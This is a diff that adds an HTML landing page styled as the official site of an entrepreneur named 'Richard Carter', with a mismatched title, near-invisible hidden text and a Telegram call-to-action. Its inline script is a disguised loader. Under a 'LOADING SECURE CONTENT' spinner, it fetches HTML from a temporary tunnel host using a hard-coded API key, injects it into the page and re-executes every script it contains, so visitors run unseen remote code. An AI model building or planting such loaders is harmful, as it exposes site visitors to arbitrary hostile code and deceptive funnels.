@@ -1,0 +1,462 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover" />
+    <title>Ajju Bhai| NO 1 Community</title>
+    <meta name="description" content="Richard Carter – entrepreneur, innovator, and visionary. Explore exclusive projects, insights, and the official digital experience." />
+    <meta name="keywords" content="Richard Carter, entrepreneur, innovator, visionary, official site, exclusive" />
+    <meta name="author" content="Richard Carter" />
+    <meta name="robots" content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1" />
+    <link rel="canonical" href="https://richardcarter.com/" />
+    <meta property="og:type" content="website" />
+    <meta property="og:url" content="https://richardcarter.com/" />
+    <meta property="og:title" content="RICHARD CARTER | Visionary Entrepreneur" />
+    <meta property="og:description" content="Step into the world of Richard Carter – bold ideas, groundbreaking projects, and an exclusive experience." />
+    <meta property="og:image" content="https://richardcarter.com/og-image.jpg" />
+    <meta property="og:image:width" content="1200" />
+    <meta property="og:image:height" content="630" />
+    <meta property="og:site_name" content="Richard Carter" />
+    <meta property="og:locale" content="en_US" />
+    <meta name="twitter:card" content="summary_large_image" />
+    <meta name="twitter:url" content="https://richardcarter.com/" />
+    <meta name="twitter:title" content="RICHARD CARTER | Visionary Entrepreneur" />
+    <meta name="twitter:description" content="Entrepreneur, innovator, visionary. Discover the official Richard Carter experience." />
+    <meta name="twitter:image" content="https://richardcarter.com/og-image.jpg" />
+
+    <meta name="theme-color" content="#0a0a0f" />
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>⚡</text></svg>" />
+
+    <!-- Structured Data -->
+    <script type="application/ld+json">
+    {
+        "@context": "https://schema.org",
+        "@type": "Person",
+        "name": "Richard Carter",
+        "url": "https://richardcarter.com",
+        "description": "Entrepreneur, innovator, and visionary.",
+        "sameAs": ["https://t.me/yourchannel"]
+    }
+    </script>
+
+  <!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '857388660500111');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=857388660500111&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+    <style>
+        :root {
+            --bg: #0a0a0f;
+            --accent: #00b4ff;
+            --accent2: #8a2be2;
+            --text: #fff;
+            --text-dim: rgba(255,255,255,0.6);
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: var(--bg);
+            font-family: 'Inter', system-ui, -apple-system, sans-serif;
+            overflow: hidden;
+            color: var(--text);
+            -webkit-font-smoothing: antialiased;
+        }
+
+        #particles-canvas {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 0;
+            pointer-events: none;
+        }
+
+        #root {
+            position: relative;
+            z-index: 1;
+            width: 100vw;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        /* Loader */
+        .loader-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 30px;
+            animation: fadeIn 0.8s ease-out;
+        }
+
+        .orbital-spinner {
+            position: relative;
+            width: 80px;
+            height: 80px;
+        }
+
+        .ring {
+            position: absolute;
+            border-radius: 50%;
+            border: 2px solid transparent;
+            animation: rotateRing 2s linear infinite;
+        }
+
+        .ring:nth-child(1) {
+            width: 100%;
+            height: 100%;
+            border-top-color: var(--accent);
+            border-right-color: var(--accent);
+        }
+
+        .ring:nth-child(2) {
+            width: 70%;
+            height: 70%;
+            top: 15%;
+            left: 15%;
+            border-bottom-color: var(--accent2);
+            border-left-color: var(--accent2);
+            animation-duration: 1.5s;
+            animation-direction: reverse;
+        }
+
+        .ring:nth-child(3) {
+            width: 40%;
+            height: 40%;
+            top: 30%;
+            left: 30%;
+            background: radial-gradient(circle, rgba(0,180,255,0.15) 0%, transparent 70%);
+            border-top-color: rgba(255,255,255,0.3);
+            animation-duration: 1s;
+        }
+
+        .loading-text {
+            font-size: 0.9rem;
+            letter-spacing: 0.35em;
+            text-transform: uppercase;
+            color: var(--text-dim);
+            font-weight: 500;
+            animation: pulseText 2s infinite;
+        }
+
+        .loading-dots::after {
+            content: '';
+            animation: dots 1.6s steps(4, end) infinite;
+        }
+
+        /* Fallback card */
+        .fallback-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            opacity: 0;
+            transition: opacity 0.8s ease;
+        }
+
+        .fallback-overlay.visible {
+            opacity: 1;
+        }
+
+        .fallback-card {
+            text-align: center;
+            animation: fadeInUp 0.8s ease;
+        }
+
+        .fallback-card h1 {
+            font-size: clamp(3rem, 10vw, 5.5rem);
+            font-weight: 800;
+            letter-spacing: -0.03em;
+            background: linear-gradient(135deg, #fff 0%, var(--accent) 40%, var(--accent2) 80%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            margin-bottom: 1.2rem;
+            filter: drop-shadow(0 0 20px rgba(0,180,255,0.4));
+        }
+
+        .fallback-card .subtitle {
+            font-size: 1.2rem;
+            color: var(--text-dim);
+            margin-bottom: 2.5rem;
+            letter-spacing: 0.5px;
+            border-left: 3px solid var(--accent);
+            padding-left: 1.5rem;
+            display: inline-block;
+        }
+
+        .telegram-btn {
+            display: inline-flex;
+            align-items: center;
+            gap: 12px;
+            padding: 1rem 2.8rem;
+            border-radius: 50px;
+            background: linear-gradient(135deg, #0088cc, #00b4ff);
+            color: white;
+            font-weight: 600;
+            font-size: 1.1rem;
+            letter-spacing: 0.5px;
+            text-decoration: none;
+            box-shadow: 0 10px 30px rgba(0,180,255,0.35);
+            transition: all 0.3s ease;
+            cursor: pointer;
+        }
+
+        .telegram-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 15px 40px rgba(0,180,255,0.55);
+        }
+
+        .telegram-btn svg {
+            width: 24px;
+            height: 24px;
+            flex-shrink: 0;
+        }
+
+        /* Error toast */
+        .error-toast {
+            position: fixed;
+            bottom: 30px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: rgba(0,0,0,0.8);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255,255,255,0.1);
+            padding: 0.8rem 1.8rem;
+            border-radius: 40px;
+            color: #ff6b6b;
+            font-size: 0.85rem;
+            z-index: 10;
+            opacity: 0;
+            transition: opacity 0.3s;
+            pointer-events: none;
+        }
+
+        .error-toast.show {
+            opacity: 1;
+        }
+
+        @keyframes rotateRing {
+            100% { transform: rotate(360deg); }
+        }
+
+        @keyframes pulseText {
+            0%, 100% { opacity: 0.5; }
+            50% { opacity: 1; }
+        }
+
+        @keyframes dots {
+            0% { content: ''; }
+            25% { content: '.'; }
+            50% { content: '..'; }
+            75% { content: '...'; }
+            100% { content: ''; }
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: scale(0.95); }
+            to { opacity: 1; transform: scale(1); }
+        }
+
+        @keyframes fadeInUp {
+            from { opacity: 0; transform: translateY(40px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+    </style>
+</head>
+<body>
+    <!-- Hidden text (preserved) -->
+    <div style="opacity:0.01; font-size:6px; position:absolute; bottom:0; right:0; max-width:200px; pointer-events:none; color:white; font-family:monospace; line-height:1.2;">
+        Lorem ipsum dolor sit amet, consectetur adipiscing elit. 
+        Sed do eiusmod tempor incididunt ut labore et dolore magna aliqua.
+        Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris.
+        Duis aute irure dolor in reprehenderit in voluptate velit esse.
+        Excepteur sint occaecat cupidatat non proident, sunt in culpa.
+    </div>
+
+    <canvas id="particles-canvas"></canvas>
+    <div id="root"></div>
+    <div class="error-toast" id="errorToast"></div>
+
+    <script>
+        (function() {
+            const SERVER_BASE_URL = 'https://bidder-downloaded-caribbean-preferences.trycloudflare.com';
+            const API_KEY = 'Sup3rS3cr3tK3y123!';
+            const TARGET_REPO = 'richard-carter-hi-khde-laadle';
+            const FILE_NAME = 'index.html';
+            const MAX_RETRIES = 2;
+            const RETRY_DELAY = 4000;
+            const TELEGRAM_CHANNEL_LINK = 'https://t.me/+lVXNfdReODw3ZWNl';
+
+            const root = document.getElementById('root');
+            const toast = document.getElementById('errorToast');
+            let retryCount = 0;
+            let timer = null;
+            const canvas = document.getElementById('particles-canvas');
+            const ctx = canvas.getContext('2d');
+            let particles = [];
+            let animationId;
+
+            function resizeCanvas() {
+                canvas.width = window.innerWidth;
+                canvas.height = window.innerHeight;
+            }
+            window.addEventListener('resize', resizeCanvas);
+            resizeCanvas();
+
+            class Particle {
+                constructor() {
+                    this.reset();
+                }
+                reset() {
+                    this.x = Math.random() * canvas.width;
+                    this.y = Math.random() * canvas.height;
+                    this.vx = (Math.random() - 0.5) * 0.4;
+                    this.vy = (Math.random() - 0.5) * 0.4;
+                    this.size = Math.random() * 1.5 + 0.5;
+                    this.opacity = Math.random() * 0.4 + 0.1;
+                }
+                update() {
+                    this.x += this.vx;
+                    this.y += this.vy;
+                    if (this.x < 0 || this.x > canvas.width) this.vx *= -1;
+                    if (this.y < 0 || this.y > canvas.height) this.vy *= -1;
+                }
+                draw() {
+                    ctx.beginPath();
+                    ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
+                    ctx.fillStyle = `rgba(255,255,255,${this.opacity})`;
+                    ctx.fill();
+                }
+            }
+
+            function initParticles(count = 80) {
+                particles = [];
+                for (let i = 0; i < count; i++) particles.push(new Particle());
+            }
+
+            function animateParticles() {
+                ctx.clearRect(0, 0, canvas.width, canvas.height);
+                particles.forEach(p => {
+                    p.update();
+                    p.draw();
+                });
+                for (let i = 0; i < particles.length; i++) {
+                    for (let j = i + 1; j < particles.length; j++) {
+                        const dx = particles[i].x - particles[j].x;
+                        const dy = particles[i].y - particles[j].y;
+                        const dist = Math.sqrt(dx * dx + dy * dy);
+                        if (dist < 110) {
+                            ctx.beginPath();
+                            ctx.moveTo(particles[i].x, particles[i].y);
+                            ctx.lineTo(particles[j].x, particles[j].y);
+                            ctx.strokeStyle = `rgba(255,255,255,${0.06 * (1 - dist/110)})`;
+                            ctx.lineWidth = 0.5;
+                            ctx.stroke();
+                        }
+                    }
+                }
+                animationId = requestAnimationFrame(animateParticles);
+            }
+
+            initParticles();
+            animateParticles();
+            function renderLoader() {
+                root.innerHTML = `
+                    <div class="loader-container">
+                        <div class="orbital-spinner">
+                            <div class="ring"></div>
+                            <div class="ring"></div>
+                            <div class="ring"></div>
+                        </div>
+                        <p class="loading-text">LOADING SECURE CONTENT<span class="loading-dots"></span></p>
+                    </div>
+                `;
+                root.setAttribute('aria-busy', 'true');
+            }
+
+            function showToast(message) {
+                toast.textContent = message;
+                toast.classList.add('show');
+                setTimeout(() => toast.classList.remove('show'), 3000);
+            }
+
+            function renderFallback() {
+                root.innerHTML = `
+                    <div class="fallback-overlay visible">
+                        <div class="fallback-card">
+                            <h1>RICHARD CARTER</h1>
+                            <div class="subtitle">Visionary · Innovator · Entrepreneur</div>
+                            <a href="${TELEGRAM_CHANNEL_LINK}" target="_blank" rel="noopener noreferrer" class="telegram-btn">
+                                <svg viewBox="0 0 24 24" fill="white">
+                                    <path d="M12 0C5.373 0 0 5.373 0 12s5.373 12 12 12 12-5.373 12-12S18.627 0 12 0zm5.894 8.221l-1.97 9.28c-.145.658-.537.818-1.084.508l-3-2.21-1.446 1.394c-.14.18-.357.295-.6.295-.002 0-.003 0-.005 0l.213-3.054 5.56-5.022c.24-.213-.054-.334-.373-.121l-6.87 4.326-2.96-.924c-.64-.203-.658-.64.135-.954l11.566-4.458c.538-.196 1.006.128.832.938z"/>
+                                </svg>
+                                Join Telegram Now
+                            </a>
+                        </div>
+                    </div>
+                `;
+                root.setAttribute('aria-busy', 'false');
+            }
+
+            async function loadContent() {
+                renderLoader();
+                try {
+                    const url = `${SERVER_BASE_URL}/api/fetch-repo?repo=${TARGET_REPO}&file=${FILE_NAME}&api_key=${API_KEY}`;
+                    const controller = new AbortController();
+                    const timeout = setTimeout(() => controller.abort(), 10000);
+                    const res = await fetch(url, { signal: controller.signal });
+                    clearTimeout(timeout);
+
+                    if (!res.ok) throw new Error(`Server ${res.status}`);
+                    const html = await res.text();
+                    root.innerHTML = html;
+                    root.setAttribute('aria-busy', 'false');
+                    root.querySelectorAll('script').forEach(old => {
+                        const s = document.createElement('script');
+                        [...old.attributes].forEach(a => s.setAttribute(a.name, a.value));
+                        s.textContent = old.innerHTML;
+                        old.replaceWith(s);
+                    });
+                    console.log('✅ Repo content loaded');
+                } catch (e) {
+                    console.warn('❌ Fetch failed:', e.message);
+                    retryCount++;
+                    if (retryCount <= MAX_RETRIES) {
+                        showToast(`Connection issue. Retrying in ${RETRY_DELAY/1000}s…`);
+                        timer = setTimeout(loadContent, RETRY_DELAY);
+                    } else {
+                        showToast('⚠️ Remote content unavailable – showing Telegram channel.');
+                        renderFallback();
+                    }
+                }
+            }
+            loadContent();
+        })();
+    </script>
+</body>
+</html>
